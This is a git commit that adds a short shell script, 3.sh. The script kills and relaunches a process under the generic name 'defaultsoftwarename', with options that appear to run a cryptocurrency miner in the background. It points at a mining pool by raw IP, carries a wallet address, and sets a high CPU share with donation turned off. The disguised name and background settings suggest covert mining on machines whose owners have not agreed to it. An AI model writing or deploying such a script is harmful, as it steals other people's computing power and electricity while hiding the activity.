0d91b5e2a7f305b048329f97398d188a5a770762
valer1311 <58904505+valer1311@users.noreply.github.com>
2020-02-15 16:02:29 +0000

    Add files via upload

---
+++ 3.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 178.32.120.156:3323 -u 45ZqVs7yZChPyukkUQcfk7Xi2wuDnzWocF3L9A3L4Jd2Z4bQC9CC4QXEvYWoEbXoWW1czvk3rPNU8i71Jb2yChQbRKF4w3i --pass=x:valer_13@yahoo.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
